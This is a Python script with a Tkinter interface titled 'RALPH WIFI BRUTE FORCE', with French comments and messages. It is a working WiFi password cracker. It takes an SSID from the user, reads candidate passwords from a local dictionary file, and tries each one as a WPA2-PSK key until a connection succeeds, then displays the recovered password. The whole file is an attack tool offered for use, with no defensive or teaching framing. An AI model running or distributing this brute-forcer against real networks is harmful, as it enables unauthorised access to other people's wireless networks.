

import time
import pywifi
import tkinter

def crack():
    global var_time , ssid
    var_time=entry_time.get()
    ssid=entry_wifi_name.get()
    if var_time=="" or ssid=="":
        try:
            from tkinter.messagebox import showerror
            showerror(title="Erreur",message="Saisisez des valeurs correctes")
        except:
            return(None)
    else:
        try:
            with open("dictionnaire.txt","r",errors="ignore") as fichier:
                for ligne in fichier:
                    password=ligne.strip()
                    wifi = pywifi.PyWiFi()
                    iface = wifi.interfaces()[0]  # Utilise la première interface WiFi, ajustez si nécessaire

                    iface.disconnect()  # Déconnexion de tout réseau actuel

                    profile = pywifi.Profile()
                    try:
                        profile.ssid = ssid
                        profile.auth = pywifi.const.AUTH_ALG_OPEN
                        profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
                        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
                        profile.key = password

                        iface.remove_all_network_profiles()
                        tmp_profile = iface.add_network_profile(profile)

                        iface.connect(tmp_profile)

                        time.sleep(int(var_time))  # Vous pouvez ajuster ce délai en fonction de la vitesse de connexion

                        if iface.status() == pywifi.const.IFACE_CONNECTED:
                            from tkinter.messagebox import showinfo
                            showinfo(title="Information",message=f"Brute force reussi , connecté avec succès\n le mot de passe est: {password} ")
                            print(f"Connecté au réseau {ssid}")
                            break
                    except:
                        from tkinter.messagebox import showerror
                        showerror(title="ERREUR",message="Aucuns des wifi ne possède ce nom")
        except:
            from tkinter.messagebox import showerror
            showerror(title="Erreur fatale",message="Aucuns fichiers dictionnaire.txt trouvé")


app=tkinter.Tk()
app.geometry("350x180")
fonts=("Calibri",15)

label1=tkinter.Label(app,text="RALPH WIFI BRUTE FORCE",font=("Calibri",25),bg="black",fg="yellow")
label_time_stop=tkinter.Label(app,font=fonts,width=8,text="Cycle time",bg="blue")
entry_time=tkinter.Entry(app,font=fonts,bg="black",fg="green",width=5)
label_wifi_name=tkinter.Label(app,font=fonts,width=8,text="WIFI SSID",bg="blue")
entry_wifi_name=tkinter.Entry(app,font=fonts,bg="black",fg="green")
button_crack=tkinter.Button(app,font=fonts,bg="purple",fg="yellow",text="CRACK",command=crack)

label1.grid(row=0,column=0,columnspan=2,pady=5)
label_time_stop.grid(row=1,column=0,pady=5)
entry_time.grid(row=1,column=1,pady=5)
label_wifi_name.grid(row=2,column=0,pady=5)
entry_wifi_name.grid(row=2,column=1,pady=5)
button_crack.grid(row=3,column=0,pady=5)

app.config(bg="brown")
app.mainloop()






            
